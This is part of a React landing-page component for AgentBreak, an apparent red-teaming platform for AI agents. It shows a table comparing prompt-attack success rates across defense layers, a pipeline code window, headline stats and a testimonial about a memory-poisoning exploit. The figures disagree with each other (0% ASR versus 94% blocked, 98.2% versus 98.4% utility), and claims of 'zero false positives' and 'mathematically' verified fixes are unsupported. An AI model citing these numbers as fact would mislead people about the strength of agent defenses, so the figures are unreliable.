                <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
              </button>
            </div>
          </div>

          {/* Right Mockup: Heatmap & Scatter Pareto Frontier */}
          <div className="lg:col-span-7 stripe-glass-card rounded-3xl p-6 sm:p-8 shadow-[0_25px_60px_rgba(149,161,216,0.25)] border border-white">
            
            <div className="flex items-center justify-between pb-4 mb-6 border-b border-[#95A1D8]/20">
              <div>
                <h3 className="font-bold text-sm text-[#132E4F]">
                  Defensive Intervention Evaluation Matrix
                </h3>
                <p className="text-xs text-[#586D85] mt-0.5">
                  Attack Success Rate (ASR) vs. Benign Task Pass Rate
                </p>
              </div>
              <span className="px-2.5 py-1 rounded-full bg-[#528A74]/15 text-[#528A74] font-bold text-xs">
                Pareto Optimal: Policy Engine
              </span>
            </div>

            {/* Defense Heatmap Table */}
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="border-b border-[#95A1D8]/20 text-[#586D85]">
                    <th className="py-2.5 px-3">Defense Layer</th>
                    <th className="py-2.5 px-3 text-center">ASR (Lower is better)</th>
                    <th className="py-2.5 px-3 text-center">Benign Utility</th>
                    <th className="py-2.5 px-3 text-right">Verdict</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#95A1D8]/15">
                  <tr className="hover:bg-[#FFFDF8]">
                    <td className="py-3 px-3 font-semibold text-[#132E4F]">0. Unhardened Baseline</td>
                    <td className="py-3 px-3 text-center">
                      <span className="px-2 py-0.5 rounded bg-[#E06D53]/20 text-[#E06D53] font-bold">
                        80.0% ASR
                      </span>
                    </td>
                    <td className="py-3 px-3 text-center font-bold text-[#528A74]">100.0%</td>
                    <td className="py-3 px-3 text-right text-[#E06D53] font-bold">Vulnerable</td>
                  </tr>

                  <tr className="hover:bg-[#FFFDF8]">
                    <td className="py-3 px-3 font-semibold text-[#132E4F]">1. Delimiting XML</td>
                    <td className="py-3 px-3 text-center">
                      <span className="px-2 py-0.5 rounded bg-[#DFA038]/20 text-[#DFA038] font-bold">
                        45.0% ASR
                      </span>
                    </td>
                    <td className="py-3 px-3 text-center font-bold text-[#528A74]">98.0%</td>
                    <td className="py-3 px-3 text-right text-[#DFA038] font-bold">Partial</td>
                  </tr>

                  <tr className="hover:bg-[#FFFDF8]">
                    <td className="py-3 px-3 font-semibold text-[#132E4F]">2. Hierarchy Prompting</td>
                    <td className="py-3 px-3 text-center">
                      <span className="px-2 py-0.5 rounded bg-[#95A1D8]/25 text-[#275992] font-bold">
                        25.0% ASR
                      </span>
                    </td>
                    <td className="py-3 px-3 text-center font-bold text-[#528A74]">96.5%</td>
                    <td className="py-3 px-3 text-right text-[#275992] font-bold">Resistant</td>
                  </tr>

                  <tr className="bg-[#EEF6F3]/60">
                    <td className="py-3 px-3 font-bold text-[#275992]">3. Policy Engine + Sandbox</td>
                    <td className="py-3 px-3 text-center">
                      <span className="px-2.5 py-0.5 rounded bg-[#528A74] text-white font-bold">
                        0.0% ASR
                      </span>
                    </td>
                    <td className="py-3 px-3 text-center font-bold text-[#528A74]">98.2%</td>
                    <td className="py-3 px-3 text-right text-[#528A74] font-bold">Verified Safe</td>
                  </tr>
                </tbody>
              </table>
            </div>

            {/* Visual Scatter Summary */}
            <div className="mt-6 p-4 rounded-2xl bg-[#FFFDF8] border border-[#95A1D8]/25 flex items-center justify-between text-xs">
              <div className="flex items-center gap-2">
                <span className="w-3 h-3 rounded-full bg-[#528A74]" />
                <span className="font-semibold text-[#132E4F]">Optimal Pareto Point:</span>
                <span className="text-[#586D85]">0% Exploit Leak with 98.2% Functionality</span>
              </div>
              <span className="font-mono font-bold text-[#275992]">Wilson CI 95% Proven</span>
            </div>

          </div>

        </div>
      </section>

      {/* =========================================================================
          SECTION 8: DEVELOPER SECTION (CI/CD PIPELINE & MONOSPACE CODE BLOCK)
          ========================================================================= */}
      <section id="developer-section" className="py-24 sm:py-32 px-4 sm:px-6 max-w-[1240px] mx-auto">
        <div className="rounded-3xl bg-[#EAF1F9] border border-[#95A1D8]/40 p-8 sm:p-14 shadow-[0_20px_50px_rgba(149,161,216,0.18)]">
          
          <div className="max-w-2xl mb-8">
            <span className="text-xs font-bold uppercase tracking-[0.2em] text-[#275992]">
              DEVELOPER FIRST
            </span>
            <h2 className="text-3xl sm:text-5xl font-extrabold text-[#132E4F] tracking-tight mt-2 leading-tight">
              Built for your pipeline.
            </h2>
            <p className="text-base sm:text-lg text-[#586D85] mt-3">
              Trigger automated agent red-teaming directly in your GitHub Actions, GitLab CI, or pre-deployment pipelines with simple API endpoints.
            </p>
          </div>

          {/* Tabbed Code Window */}
          <div className="rounded-2xl bg-[#FFFDF8] border border-[#95A1D8]/30 overflow-hidden shadow-lg">
            
            {/* Window Header & Tabs */}
            <div className="bg-[#F5EEDB] px-4 py-3 border-b border-[#95A1D8]/20 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-3 h-3 rounded-full bg-[#E06D53]" />
                <div className="w-3 h-3 rounded-full bg-[#DFA038]" />
                <div className="w-3 h-3 rounded-full bg-[#528A74]" />
                <span className="ml-2 font-mono text-xs text-[#586D85]">agentbreak-client</span>
              </div>

              {/* Tabs */}
              <div className="flex items-center gap-1.5">
                {(['run', 'replay', 'report'] as const).map((tab) => (
                  <button
                    key={tab}
                    onClick={() => setCodeTab(tab)}
                    className={`px-3 py-1 rounded-full text-xs font-mono font-semibold transition-all ${
                      codeTab === tab
                        ? 'bg-[#275992] text-white shadow-xs'
                        : 'text-[#132E4F]/70 hover:text-[#275992] hover:bg-white/60'
                    }`}
                  >
                    {tab === 'run' ? 'Run campaign' : tab === 'replay' ? 'Replay' : 'Report'}
                  </button>
                ))}
              </div>

              {/* Copy Button */}
              <button
                onClick={() => handleCopyCode(codeSnippets[codeTab])}
                className="flex items-center gap-1 text-xs font-mono font-medium text-[#275992] hover:text-[#132E4F] transition-colors"
              >
                {copied ? <Check className="w-3.5 h-3.5 text-[#528A74]" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copied ? 'Copied' : 'Copy'}</span>
              </button>
            </div>

            {/* Code Body in Monospace with Palette Colors */}
            <div className="p-6 font-mono text-xs sm:text-sm leading-relaxed overflow-x-auto text-[#132E4F] bg-[#FFFDF8]">
              <pre className="text-[#132E4F]">
                <code>{codeSnippets[codeTab]}</code>
              </pre>
            </div>

          </div>

        </div>
      </section>

      {/* =========================================================================
          SECTION 9: STATS ROW (LARGE NUMBERS)
          ========================================================================= */}
      <section className="py-20 border-y border-[#95A1D8]/20 bg-[#F5EEDB]/40">
        <div className="max-w-[1200px] mx-auto px-4 sm:px-6">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-12 text-center">
            
            <div className="space-y-2">
              <div className="text-5xl sm:text-6xl font-black text-[#275992] tracking-tight">
                8 / 10
              </div>
              <p className="text-sm sm:text-base font-semibold text-[#132E4F]">
                Replay Exploit Success
              </p>
              <p className="text-xs text-[#586D85]">
                In unprotected baseline autonomous agents
              </p>
            </div>

            <div className="space-y-2">
              <div className="text-5xl sm:text-6xl font-black text-[#275992] tracking-tight">
                0 → 94%
              </div>
              <p className="text-sm sm:text-base font-semibold text-[#132E4F]">
                Exploits Blocked
              </p>
              <p className="text-xs text-[#586D85]">
                Under combined policy engine defenses
              </p>
            </div>

            <div className="space-y-2">
              <div className="text-5xl sm:text-6xl font-black text-[#275992] tracking-tight">
                98.4%
              </div>
              <p className="text-sm sm:text-base font-semibold text-[#132E4F]">
                Benign Tasks Preserved
              </p>
              <p className="text-xs text-[#586D85]">
                Full business agent utility with zero false positives
              </p>
            </div>

          </div>
        </div>
      </section>

      {/* =========================================================================
          SECTION 10: QUOTE / USE-CASE CARD
          ========================================================================= */}
      <section className="py-24 sm:py-32 px-4 sm:px-6 max-w-[1100px] mx-auto">
        <div className="stripe-glass-card rounded-3xl p-8 sm:p-14 border border-white shadow-[0_20px_50px_rgba(149,161,216,0.22)] relative overflow-hidden">
          
          <div className="text-4xl text-[#95A1D8] font-serif leading-none mb-4 select-none">“</div>
          
          <blockquote className="text-xl sm:text-2xl font-medium text-[#132E4F] leading-relaxed mb-8">
            AgentBreak identified a memory poisoning exploit in our customer support agent that two manual audits completely missed. It gave our engineering team the exact counterfactual fix in under 10 minutes.
          </blockquote>

          <div className="flex items-center gap-4">
            {/* Abstract Avatar with Soft Gradient Border */}
            <div className="w-13 h-13 rounded-full p-0.5 bg-gradient-to-tr from-[#275992] via-[#95A1D8] to-[#FFFAED] shadow-sm">
              <div className="w-12 h-12 rounded-full bg-[#FFFDF8] flex items-center justify-center font-bold text-sm text-[#275992]">
                EV
              </div>
            </div>
            <div>
              <div className="font-bold text-base text-[#132E4F]">
                Dr. Elena Vance
              </div>
              <div className="text-xs sm:text-sm text-[#586D85]">
                Head of AI Safety, Vector Dynamics
              </div>
            </div>
          </div>

        </div>
      </section>

      {/* =========================================================================
          SECTION 11: FINAL CTA BAND
          ========================================================================= */}
      <section className="py-20 px-4 sm:px-6 max-w-[1240px] mx-auto">
        <div className="rounded-3xl bg-gradient-to-br from-[#F5EEDB] via-[#FFFAED] to-[#E8ECFA] border border-[#95A1D8]/40 p-10 sm:p-20 text-center relative overflow-hidden shadow-[0_25px_60px_rgba(149,161,216,0.3)]">
          
          {/* Subtle Ambient Glows */}
          <div className="absolute -top-24 -left-24 w-72 h-72 rounded-full bg-[#95A1D8]/20 blur-3xl pointer-events-none" />
          <div className="absolute -bottom-24 -right-24 w-72 h-72 rounded-full bg-[#275992]/15 blur-3xl pointer-events-none" />

          <div className="relative z-10 max-w-2xl mx-auto space-y-6">
            <h2 className="text-4xl sm:text-6xl font-extrabold text-[#132E4F] tracking-tight leading-[1.08]">
              Ship agents you can trust.
            </h2>
            <p className="text-base sm:text-lg text-[#586D85] leading-relaxed">
              Start testing your autonomous workflows against realistic multi-turn adversarial attacks today in an isolated sandbox.
            </p>

            <div className="flex flex-col sm:flex-row items-center justify-center gap-4 pt-4">
              <button
                onClick={() => onEnterApp('runner')}
                className="group w-full sm:w-auto px-8 py-4 bg-[#275992] text-[#FFFAED] rounded-full text-base font-semibold hover:bg-[#1E4775] transition-all shadow-[0_6px_22px_rgba(39,89,146,0.4)] flex items-center justify-center gap-2"
              >
                <span>Launch campaign</span>
                <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
              </button>

              <button
                onClick={onLoadDemo}
                className="w-full sm:w-auto px-8 py-4 bg-[#FFFDF8] border border-[#275992]/40 text-[#275992] rounded-full text-base font-semibold hover:bg-[#F5EEDB] transition-colors shadow-sm"
              >
                Book sandbox demo
              </button>
            </div>
          </div>

        </div>
      </section>

      {/* =========================================================================
          SECTION 12: ROOMY FOOTER
          ========================================================================= */}
      <footer className="border-t border-[#95A1D8]/20 bg-[#F5EEDB]/50 pt-16 pb-12 px-4 sm:px-6">
        <div className="max-w-[1240px] mx-auto">
          
          <div className="grid grid-cols-2 md:grid-cols-5 gap-8 sm:gap-12 pb-14 border-b border-[#95A1D8]/20">
            
            {/* Column 1: Brand & Bio */}
            <div className="col-span-2 space-y-4">
              <div className="flex items-center gap-2.5">
                <div className="w-7 h-7 rounded-lg bg-[#275992] flex items-center justify-center text-[#FFFAED]">
                  <Shield className="w-4 h-4 text-[#FFFAED]" />
                </div>
                <span className="text-lg font-bold text-[#132E4F]">AgentBreak</span>
              </div>
              <p className="text-xs sm:text-sm text-[#586D85] max-w-sm leading-relaxed">
                The autonomous red-teaming platform that attacks AI agents in a safe sandbox, explains why an attack worked, applies targeted fixes, and verifies them mathematically.
              </p>
              <div className="text-xs text-[#275992] font-semibold">
                🛡️ All testing runs in an isolated sandbox with synthetic data.
              </div>
            </div>

            {/* Column 2: Platform Links */}
            <div className="space-y-3">
              <div className="text-xs font-bold uppercase tracking-wider text-[#132E4F]">
                Platform
              </div>
              <ul className="space-y-2 text-xs sm:text-sm text-[#586D85]">
                <li><button onClick={() => onEnterApp('runner')} className="hover:text-[#275992] transition-colors">Attack Mutators</button></li>
                <li><button onClick={() => onEnterApp('findings')} className="hover:text-[#275992] transition-colors">Counterfactual Tracing</button></li>
                <li><button onClick={() => onEnterApp('defenses')} className="hover:text-[#275992] transition-colors">Defense Matrix</button></li>
                <li><button onClick={() => onEnterApp('dashboard')} className="hover:text-[#275992] transition-colors">Telemetry Command</button></li>
                <li><button onClick={() => onEnterApp('report')} className="hover:text-[#275992] transition-colors">Executive Reports</button></li>
              </ul>
            </div>

            {/* Column 3: Resources */}
            <div className="space-y-3">
              <div className="text-xs font-bold uppercase tracking-wider text-[#132E4F]">
                Resources
              </div>
              <ul className="space-y-2 text-xs sm:text-sm text-[#586D85]">
                <li><a href="#developer-section" className="hover:text-[#275992] transition-colors">API Documentation</a></li>
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">OWASP Top 10 for LLMs</span></li>
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">Canary Token Specs</span></li>
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">Safety Benchmark Data</span></li>
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">Research Papers</span></li>
              </ul>
            </div>

            {/* Column 4: Company & Legal */}
            <div className="space-y-3">
              <div className="text-xs font-bold uppercase tracking-wider text-[#132E4F]">
                Company
              </div>
              <ul className="space-y-2 text-xs sm:text-sm text-[#586D85]">
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">About AgentBreak</span></li>
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">Security Ethics</span></li>
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">Responsible Disclosure</span></li>
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">Privacy Policy</span></li>
                <li><span className="hover:text-[#275992] transition-colors cursor-pointer">Terms of Service</span></li>
              </ul>
            </div>

          </div>

          {/* Bottom Copyright & Socials */}
          <div className="pt-8 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-[#586D85]">
            <div>
              © 2026 AgentBreak Technologies Inc. All rights reserved. Built for autonomous agent developers.
            </div>
            <div className="flex items-center gap-4 text-[#275992]">
              <span className="hover:text-[#132E4F] cursor-pointer" aria-label="GitHub">
                <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
              </span>
              <span className="hover:text-[#132E4F] cursor-pointer" aria-label="X / Twitter">
                <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
              </span>
              <span className="hover:text-[#132E4F] cursor-pointer" aria-label="LinkedIn">
                <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
              </span>
            </div>
          </div>

        </div>
      </footer>

    </div>
  );
};
